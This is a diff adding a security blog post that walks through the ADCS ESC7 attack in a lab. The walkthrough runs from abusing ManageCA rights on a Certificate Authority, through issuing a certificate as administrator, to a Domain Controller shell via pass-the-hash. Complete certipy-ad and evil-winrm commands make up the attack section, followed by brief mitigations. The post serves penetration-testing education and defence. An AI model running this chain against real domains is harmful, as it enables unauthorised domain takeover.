@@ -1,0 +1,232 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC7 – Vulnerable Certificate Authority Access Control</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc7-vulnerable-certificate-authority-access-control/" rel="bookmark"><time class="entry-date published" datetime="2025-05-25T11:37:34+00:00">May 25, 2025</time><time class="updated" datetime="2025-06-19T13:22:56+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000"><strong>ESC7</strong> is a critical security vulnerability where attackers exploit weak <strong>access controls</strong> within <strong>Certificate Authorities (CAs)</strong>. By targeting key permissions like <strong>ManageCA</strong> and <strong>Manage Certificates</strong>, attackers can compromise <strong>certificate management systems</strong>. The <strong>ManageCA</strong> permission grants administrative control, allowing attackers to modify settings like <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> and exploit vulnerabilities such as <a style="color: #000000" href="https://www.hackingarticles.in/esc6-editf_attributesubjectaltname2/">ESC6</a> using <strong>PSPKI cmdlets</strong>. Meanwhile, <strong>ManageCertificates</strong> enables attackers to bypass certificate issuance checks, weakening security.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<ul>
+<li><span style="color: #000000"><strong>Overview the ESC7 Attack</strong></span></li>
+<li><span style="color: #000000"><strong>Compairing ESC6 and ESC7</strong></span></li>
+<li><span style="color: #000000"><strong>Prerequisites </strong></span></li>
+<li><span style="color: #000000"><strong>Lab setup</strong></span></li>
+</ul>
+<p><span style="color: #000000"><strong>Enumeration &amp; Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000">Abusing CA Management Rights with Certipy</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000">Overview of the ESC7 Attack</span></h3>
+<p><span style="color: #000000"><strong>ESC7</strong> is a privilege escalation attack vector against Active Directory Certificate Services (ADCS) that arises from insecure access control on a Certificate Authority (CA). Specifically, it targets cases where powerful CA-level permissions are mistakenly granted to unprivileged or low-privileged accounts, such as:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>ManageCA</strong></span></li>
+<li><span style="color: #000000"><strong>Manage Certificates</strong></span></li>
+</ul>
+<p><span style="color: #000000">These permissions, when misused or misunderstood, can provide a direct path to domain compromise through illegitimate certificate issuance.</span></p>
+<h4><span style="color: #000000">What Makes ESC7 Possible?</span></h4>
+<p><span style="color: #000000">The foundation of the ESC7 attack is misconfigured Discretionary Access Control Lists (DACLs) on the CA itself accessed through certsrv.msc.</span></p>
+<p><span style="color: #000000">Key Permissions That Enable ESC7:</span></p>
+<h5><strong><span style="color: #000000">ManageCA</span></strong></h5>
+<ul>
+<li><span style="color: #000000">Grants control over CA configuration, including:</span></li>
+<li><span style="color: #000000">Adding or enabling certificate templates.</span></li>
+<li><span style="color: #000000">Modifying CA policy settings.</span></li>
+<li><span style="color: #000000">Setting the EDITF_ATTRIBUTESUBJECTALTNAME2 flag often exploited in ESC6 style abuses.</span></li>
+<li><span style="color: #000000">Can be used to elevate or forge any template to make it exploitable.</span></li>
+</ul>
+<p><span style="color: #000000"><em>Note: This is the most dangerous permission in ESC7.</em></span></p>
+<h5><strong><span style="color: #000000">ManageCertificates</span></strong></h5>
+<ul>
+<li><span style="color: #000000">Allows approval of pending certificate requests.</span></li>
+<li><span style="color: #000000">Can be used to bypass manual approval workflows.</span></li>
+<li><span style="color: #000000">It doesn’t grant template configuration rights but lets a user finalise potentially malicious requests (e.g., for administrator@ignite.local).</span></li>
+</ul>
+<h3><span style="color: #800000">Compairing ESC6 and ESC7</span></h3>
+<h4><span style="color: #000000"><strong>Root Cause </strong></span></h4>
+<h5><span style="color: #000000"><strong>ESC6:</strong></span></h5>
+<p><span style="color: #000000">It occurs when a misconfigured template, like ENROLLEE_SUPPLIES_SUBJECT, is accessible to low-privileged users, allowing exploitation without CA access. </span></p>
+<h5><span style="color: #000000"><strong>ESC7</strong>: </span></h5>
+<p><span style="color: #000000">The CA is misconfigured with ACLs (set via certsrv.msc), giving unprivileged users like raj@ignite.local rights such as ManageCA or ManageCertificates.</span></p>
+<h4><span style="color: #000000">Abuse Vector</span></h4>
+<h5><span style="color: #000000"><strong>ESC6:</strong></span></h5>
+<ul>
+<li><span style="color: #000000">The Attacker simply <strong>enrols</strong> via a dangerous template (if they have access).</span></li>
+</ul>
+<h5><span style="color: #000000"><strong>ESC7:</strong></span></h5>
+<ul>
+<li><span style="color: #000000">The Attacker first <strong>manages the CA</strong>:</span>
+<ul>
+<li><span style="color: #000000">Enables a dangerous template like SubCA.</span></li>
+<li><span style="color: #000000">Adds a second user (raj@ignite.local) as a certificate officer.</span></li>
+<li><span style="color: #000000">Issues a certificate impersonating administrator@ignite.local.</span></li>
+</ul>
+</li>
+</ul>
+<h4><span style="color: #000000">Permissions Required</span></h4>
+<h5><span style="color: #000000"><strong>ESC6</strong>:</span></h5>
+<ul>
+<li><span style="color: #000000">Enrol in a vulnerable template.</span></li>
+<li><span style="color: #000000">Template must support:</span>
+<ul>
+<li><span style="color: #000000">ENROLLEE_SUPPLIES_SUBJECT</span></li>
+<li><span style="color: #000000">Client Authentication EKU</span></li>
+</ul>
+</li>
+</ul>
+<h5><span style="color: #000000"><strong>ESC7</strong>:</span></h5>
+<ul>
+<li><span style="color: #000000">ManageCA or ManageCertificates on the CA.</span></li>
+<li><span style="color: #000000">These allow the user to:</span></li>
+<li><span style="color: #000000">Enable/approve templates</span></li>
+<li><span style="color: #000000">Issue requests</span></li>
+<li><span style="color: #000000">Modify key CA policy flags</span></li>
+</ul>
+<h4><span style="color: #000000">Real-World Impact</span></h4>
+<h5><span style="color: #000000"><strong>ESC6</strong>:</span></h5>
+<ul>
+<li><span style="color: #000000">Allows forging certs to <strong>authenticate as any user</strong>.</span></li>
+</ul>
+<h5><span style="color: #000000"><strong>ESC7:</strong></span></h5>
+<ul>
+<li><span style="color: #000000">Does all the above <strong>plus:</strong></span>
+<ul>
+<li><span style="color: #000000">Manage templates</span></li>
+<li><span style="color: #000000">Approve requests</span></li>
+<li><span style="color: #000000">Reconfigure the CA</span></li>
+<li><span style="color: #000000">Full control over certificate infrastructure</span></li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000"><em>Note: Unlike <strong>ESC6</strong>, which targets existing vulnerabilities, <strong>ESC7</strong> lets attackers create or enable them, making it a broader and more dangerous threat, especially in environments with weak <strong>CA permissions</strong>.</em></span></p>
+<h3><span style="color: #800000">Prerequisite</span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000">The domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000">Kali Linux is packed with tools</span></li>
+<li><span style="color: #000000">Tools: Evil-Winrm, certipy-ad</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup</span></h3>
+<p><span style="color: #000000">This article begins by examining a common misconfiguration where someone grants excessive permissions on a Certificate Authority (CA), potentially allowing attackers to escalate privileges or compromise the domain environment.</span></p>
+<h4><span style="color: #000000">Reviewing Certificate Authority Security Permissions</span></h4>
+<p><span style="color: #000000">We start by reviewing the Certificate Authority (CA) properties to understand how access control misconfigurations can enable an ESC7 attack.</span></p>
+<p><span style="color: #000000">Launch <strong>certsrv.msc</strong> on the CA server, right-click the CA name (e.g., <strong>ignite-DC-CA</strong>), and select <strong>Properties</strong>.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9t0JugyUojkybmbOGkL7J0zL-LQ2V-J01GLN9YgWBbzcQRY9JmjKiWD2tehJBYHXMx7yjGdEhbMA8Ot7QZ7wwfYHAMbDXKCpYe6sPWvqhFuSkcx-j2MjxyP8uJazT0kUsyJjKiK_-dvre-_BhCedpWcstimKK6y0UaVhyl0O0PcsgMx8I3CfPYZuXHFTQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000"> Inspect the security settings, go to the <strong>Security</strong> tab and review the list of users/groups along with their assigned permissions. In this case, <strong>Authenticated Users</strong> have been granted the permission to <strong>Request Certificates.</strong></span></p>
+<p><span style="color: #000000"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihpe6Yffp6Onyl0Ysa-jld5o_RSTPE7d6uCkYhL4kYyChlzjTkgiDJkMelawVuNR7bPtoJewk4xfCc3mPgQ-4Xw5p0MPSSxyPuNSrCTyNegOF5D3gacDuivICY6wHTvtkvgkP1Z0P_FQGeRFs-CF4YLHv8asC1IsfMuawKeIoZhT6hl2D1n9ZYgz1l7FID/s667/2.png" alt="ADCS ESC7 vulnerability exploitation" width="505" height="667"/></span></p>
+<p><span style="color: #000000">While this is already a potential risk when combined with weak certificate templates, the following misconfiguration poses an even greater threat.</span></p>
+<h4><span style="color: #000000">Red Flag: Non-Admin User with “Manage CA” Rights</span></h4>
+<p><span style="color: #000000">In this scenario, a standard domain user, raj (from IGNITEraj), has been explicitly granted “Manage CA” permission on the Certificate Authority.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMevySjrDXassOue9X-IxpUXA4kZc1kmwZ1Dq512cFtx9VtVKxIf_wt7Svv1sC3lma1kSe7akmADcw4cQKGfR1bVsVkFncjylt5exdpJ3XdVkU_IN7emNFkMlswUn_Dc1YV6ya5YRHLwEU4XVyOES0sg_ztVjpp8AsMpmOiTS2CuEXFghrM9XQPyxVQjxp/s667/3.png"/></span></p>
+<p><span style="color: #000000">Why This Is Dangerous:</span></p>
+<p><span style="color: #000000">The <strong>“Manage CA”</strong> permission allows users to:</span></p>
+<ul>
+<li><span style="color: #000000">Modify certificate templates.</span></li>
+<li><span style="color: #000000">Configure certificate issuance policies.</span></li>
+<li><span style="color: #000000">Add or remove Enrollment Agents.</span></li>
+<li><span style="color: #000000">Restart the CA service.</span></li>
+</ul>
+<h3><span style="color: #800000">Enumeration &amp; Exploitation</span></h3>
+<h4><span style="color: #000000">Abusing CA Management Rights with Certipy</span></h4>
+<p><span style="color: #000000">With access to Raj with CA permissions, we’ll now walk through the full <strong>attack chain using Certipy</strong>.</span></p>
+<h5><strong><span style="color: #000000">Discover Vulnerable and Enabled Templates</span></strong></h5>
+<p><span style="color: #000000">The first step is to <strong>enumerate templates</strong> that the CA both <strong>enables</strong> and that are potentially <strong>vulnerable</strong> to abuse, including those with weak permissions or risky configurations, such as ENROLLEE_SUPPLIES_SUBJECT.</span></p>
+<p><span style="color: #000000">This is done using:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite.local' -p Password@1 -dc-ip 192.168.1.48 -vulnerable -enabled</pre>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizpdR7EIpyelh_A_238QN1eIB2l_ubxVUBHtDxqqmZYXk4yBbEKsQ8CnJxhIVZAd8-_wrwObnW42sAlCjG-zzkKHvfnxSmGY-yqfzwTONPhziJIcwJaMVeKUN9KhlapEodtfMdf7a-ZMzYYhPWzbWgKge57LUvlokxwDjWPa4XXJlcpjRSxWn_46vxbEuP/s1021/4.png" alt="ADCS ESC7 vulnerability exploitation" width="1021" height="302"/></span></p>
+<p><span style="color: #000000">The command queries AD CS to list enabled templates, identify vulnerabilities, and assess configurations like enrollment permissions, subject fields, and EKU settings.</span></p>
+<p><span style="color: #000000">Let’s read the content saved in a <strong>.txt</strong> or <strong>.json</strong> file format.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfeO4o_KnBQHIjjpstaNPmRhvFGDiBtndR-vZy4l6i6yF45UaQwHn3gnpC6JCWMfZWGdGQxC3aMUpEkoGnBFYqUqY2S86rDDFOi3O5FHrUsF_uMKetalO4UDA3_zKDD8b1BaU5opzfE8JI7vFWygBwk_XVtuiMLOb1j41uEhS6sCq9ReOGGN6hUGZo_6AO/s979/5.png"/></span></p>
+<p><span style="color: #000000">This confirms that a non-privileged user, raj, has dangerous permissions (ManageCa), opening the door to ESC7.</span></p>
+<h5><strong><span style="color: #000000">Add a Certificate Officer (Abuse ManageCA Permission)</span></strong></h5>
+<p><span style="color: #000000">We now leverage the ManageCA permission (granted to raj@ignite.local) to assign the same user as a Certificate Officer, effectively making them an enrollment agent capable of issuing certificates on behalf of others.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad  ca -ca ignite-DC-CA -add-officer raj -u raj@ignite.local -p Password@1 -target 192.168.1.48 -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEijmQqijzDHMbXTsta29u-myJE0tmkGv6JjCftqabziwK96aVUTzoxUROC4opGyh2_AKOvE9UCoiKuHOHSMjSzi8eF-2iPg7cKcS3W7ZqwZJp0_Ezgf7QxkaKEGHHz7i47JM9ZbGixE2XbXr47k4KsM6z3jlRtRtwgPNE9dYZ5rioojmQkc2S8RpJcKgzaG/s1368/6.png" alt="ADCS ESC7 vulnerability exploitation" width="1368" height="134"/></span></p>
+<h5><strong><span style="color: #000000">Enable a Dangerous Template (SubCA)</span></strong></h5>
+<p><span style="color: #000000">We now enable a high-privilege certificate template (SubCA) that can be exploited for authentication impersonation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -ca ignite-DC-CA -u raj@ignite.local -p Password@1 -target 192.168.1.48 -enable-template SubCA -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkoTiX-MPTx_zw-srmOTrkx4rbhyphenhyphenib97oXZu7-aVx8zgKC6hu7PgGQwRKwir3y5in3vmqb4128OEfdVMTJ9yCEyuSsmi6TBVzZvpdtnAQREHC3wkPggT-edVoKC8pDudGaocLPiFyug7i52-nzQDbu0lzvh3TmgcjCzn1_wiKg4URZvYGkOYtRlp4mE49n/s1417/7.png"/></span></p>
+<p><span style="color: #000000">This makes templates such as SubCA vulnerable to abuse, especially if they include insecure settings like ENROLLEE_SUPPLIES_SUBJECT or weak Client Authentication EKUs.</span></p>
+<h5><strong><span style="color: #000000">Enumerate Enabled Certificate Templates</span></strong></h5>
+<p><span style="color: #000000">Now let’s confirm what templates are enabled and usable with:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite.local' -p Password@1 -dc-ip 192.168.1.33 -enabled</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMyd_Nkt8a5yJpH1qe8Cb8afnqNpdCT2ghVUL0sTXSvo4170-sbedFaDter2B66QuEmOadCeWON2CHxPRvrxfD2aEzanEyHmIAC9TkHE8aXlskUKTUdyQljaWFMvK7c-SjIakPgGln9DUW8UWPKWPqaXH491aDmf9mXqVHD93fEPLhtxD4hGIIsb5vL7xH/s970/8.png" alt="ADCS ESC7 vulnerability exploitation" width="970" height="310"/></span></p>
+<p><span style="color: #000000">This enumeration helps us to assess the template landscape, a crucial step before exploiting any vulnerabilities.</span></p>
+<p><span style="color: #000000">The output can be saved in .txt or .json format for further analysis and review.</span></p>
+<p><span style="color: #000000">Check for:</span></p>
+<ul>
+<li><span style="color: #000000">The SubCA template is being enabled</span></li>
+<li><span style="color: #000000">Support for EKUs</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUf24BCJf8ueZrogtSOnvG9XW9Wz0e81eCIAXO7-SYbIR3hv6ZUkVEnA6w2XSL8C7iaOA_K3yc-rtW4wgbiImqq1uLoFgchJDpwbhel6LIvA0suC8Wo5kMbVxxtnI3COGrkSRWSCcqlcv1Vx4YVh8IV-kSGgAupRSmckXwKXVW9HfcteUqTEZo0sszufs2/s857/9.png"/></span></p>
+<p><span style="color: #000000">This confirms that we have enabled and exploited dangerous EKUs. If we find SubCA to be enabled and insecurely configured, we proceed to request a certificate for <strong>administrator@ignite.local</strong>.</span></p>
+<h5><strong><span style="color: #000000">Request Certificate as Administrator</span></strong></h5>
+<p><span style="color: #000000">We exploit the officer’s rights to request a certificate for another user’s identity, in this case, <strong>administrator@ignite.local</strong><strong>.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u raj@ignite.local -p Password@1 -ca ignite-DC-CA -target 192.168.1.48 -template SubCA -upn administrator@ignite.local -dc-ip 192.168.1.48</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBDZBHb5QdSY0RZJ8uKzWuTgbV2pUV9ecGrPJbR-bcjuDAGyGLim4Ov1VApTR5hbDCA34NtOJBQXfYLI0e81MgQUHoHSxdiZeFzcq3GsxnvAKQICxngbLj50wL0KsQp1NVBXqudWz5pIdpF9SRrThhhrnPJMHBghLnu8VEUC8ak3rcO-O4DWo3WTdc4mwX/s16000/10.png"/></p>
+<p><span style="color: #000000">If successful, the system queues this request for approval or immediate issuance, depending on the CA configuration.</span></p>
+<p><span style="color: #000000">With raj@ignite.local having ManageCA rights, we can request certificates for any user, including admins. Our initial attempt to request a certificate for administrator@ignite.local using a SubCA template failed with Request ID 17.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEij83AxazJztPQyLHH2KKpEMZAu_MWkWLQ9SM6D9WqA8bKa7wf6jUNRZrDnxYcs3kb7iGKTr-DyiGLaKDwvO5UZe6IOsd5FK2Oj38Mk6KwN5dAdY9iFQERI5OMP2zo1QmwLBPzO9ArgG_KxFY3oZHLXGdR-XAhTyyY9Bj_NcLaR7iBawuNHlWy9qn09hylX/s1030/11.png"/></span></p>
+<p><span style="color: #000000"><strong><em>Note: </em></strong><strong><em>Note:</em></strong><em> The certificate request may fail due to various reasons such as template restrictions, CA policy settings, pending approvals, incorrect parameters, or additional access controls. These mechanisms help prevent unauthorized certificate issuance, even if ManageCA permissions are present.</em></span></p>
+<h5><strong><span style="color: #000000">Issue the Request</span></strong></h5>
+<p><span style="color: #000000">However, armed with the necessary CA permissions, we can bypass restrictions by either forcing or manually approving the Certificate Authority (CA) to authorise the certificate request.</span></p>
+<p><span style="color: #000000">If the certificate request is still pending (request ID = 17 in this case), issue it manually:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca  -u raj@ignite.local -p Password@1 -ca ignite-DC-CA -target 192.168.1.48 -issue-request 17 -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrcy1IbNoa5QrIZQSzrzRieNkeueGN2uAlEBbZwHVMA4KGfScUzG74VPdX_0ulfhG-Dydb0Ld_jEZI9QSUMXICdBvOo87FaCRRp3YfhbZKaHFJwpQ23ltSMRk9a8hRDbXeIlrxgutaeAxl7GEl97EGCbvo16rR9-jpaEK1KZEfvpR6f_0RvTg3o-wpvMje/s1347/12.png" alt="ADCS ESC7 vulnerability exploitation" width="1347" height="122"/></span></p>
+<p><span style="color: #000000">This simulates <strong>manual certificate approval</strong>, which Raj can perform due to Manage CA rights.</span></p>
+<h5><strong><span style="color: #000000">Retrieve the Issued Certificate</span></strong></h5>
+<p><span style="color: #000000">Once we issue the certificate request (either automatically or manually approve it), we retrieve the resulting <strong>.crt</strong> file using:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u raj@ignite.local -p Password@1 -ca ignite-DC-CA -target 192.168.1.48 -template SubCA  -retrieve 17 -dc-ip 192.168.1.48</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEii8CRsuaBz1Cw-La53QS76p6eQeKJEg0-SKY7QHmyy4QTpq1hEAcuL9fKYWXbdHWSvnTFTLOW3ji08MehdFtotAC49MGaTLAaZGztpcILwccx6IAirOhyphenhyphen-fOI19ymR6wSbaxUdXBkI40GJ3G02daXTSjTWm8bBiTmnd9cIUjzTpP59wx85Vxwc2RUyvcQv/s16000/13.png"/></p>
+<p><span style="color: #000000">Note: You can split the issuing and retrieval steps based on the tool version or permission delegation.</span></p>
+<p><span style="color: #000000">We can confirm that someone has retrieved the certificate for issuance, and you can find it under “Issued Certificates.”</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNNWeiOyFMWkD6xSf2TSBx81TumKIvTKicMrp58GiZps2lTaXJFNalHBZyOmz6dglJnq7dlUYO73FjFaVWCKF3CSubt7tFNLMEwncyl4CCet6TdeUoWejaz30rKSGR9CPni_pkC-B4G-kufLtM4nRc0rUp-AKYRDD0SIBHQ05H-N3pJcnYxvyQ5mwDWa3y/s1050/14.png" alt="ADCS ESC7 vulnerability exploitation" width="1050" height="474"/></span></p>
+<h5><strong><span style="color: #000000">Authenticate as Administrator with Certificate</span></strong></h5>
+<p><span style="color: #000000">To <strong>authenticate with this certificate</strong>, we need to <strong>combine it with the private key</strong> to create a .pfx file.</span></p>
+<p><span style="color: #000000"><em>Note: Certipy handles this automatically when making the request (e.g., in Step 6). However, if you retrieve the certificate separately (as in this case), you must manually associate it with the private key used in the original request.</em></span></p>
+<p><span style="color: #000000">Using the .pfx file we’ve obtained, we authenticate to Active Directory as administrator:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx  -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFBiTNp2aAh5CZ741ohUm2c_KJTV7NfNKFqZCJMEgVm1cvwgdQDTAVggBDB_2s7eUO7dsb_FaBkUqTf0KxwkMpe5VAsXB6WL_F73SKPJh14rZJOQuXXb6re_xA2gmkj9OdUwuOZ6k9h_usMRphxkWl94Cf-2-Mvvdb8NgMnxLatklqM5H-S9Rsz7JzowiV/s1171/15.png"/></span></p>
+<p><span style="color: #000000">This confirms that we have successfully authenticated as a domain administrator—without ever needing to know the administrator’s password.</span></p>
+<h3><span style="color: #800000">Post Exploitation</span></h3>
+<h5><strong><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></strong></h5>
+<p><span style="color: #000000">We now use evil-winrm and the NTLM hash to get a shell on the target domain controller:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.48 -u administrator -H 32196b56ffe6f45e294117b91a83bf38</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhlCpUGobXA51iQasSbzBL_UCsEMNEiffnfyv_xevisvVEh0oYQ20kapQbCdaVngEfKXPQMK4nMLBTvdrEOiKMTt4Geq7-aDPe7OAihwQ_zKao5_kRwLO5sEp2LNh-WTNfJbkvczatBMy4K0KPYTq85KaQfas-x1W9XF0bckWNd_QstM_mzY88xKK3nmTts/s904/16.png" alt="ADCS ESC7 vulnerability exploitation" width="904" height="248"/></span></p>
+<p><span style="color: #000000">As a result, we gain a full administrative shell on the Domain Controller via WinRM, operating with Domain Admin privileges.</span></p>
+<h3><span style="color: #800000">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000">Audit who has <strong>“Manage CA”</strong></span></li>
+<li><span style="color: #000000">Restrict enrollment rights on all templates.</span></li>
+<li><span style="color: #000000">Disable NTLM wherever possible.</span></li>
+<li><span style="color: #000000">Enable <strong>EPA (Extended Protection for Authentication)</strong> on /certsrv/.</span></li>
+<li><span style="color: #000000">Keep an eye on templates with excessively lax parameters and certificate issuance logs.</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact</span> <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" title="ADCS ESC4: Vulnerable Certificate Template Access Control">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC4: Vulnerable Certificate Template Access Control</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/ad-cs-esc5-vulnerable-pki-object-access-control/" title="ADCS ESC5: Vulnerable PKI Object Access Control">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC5: Vulnerable PKI Object Access Control</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/esc6-editf_attributesubjectaltname2/" rel="prev">ADCS ESC6: Editf_attributesubjectaltname2</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/" rel="next">ADCS ESC8 – NTLM Relay to AD CS HTTP Endpoints</a></div></div>
+	</nav>        </div>
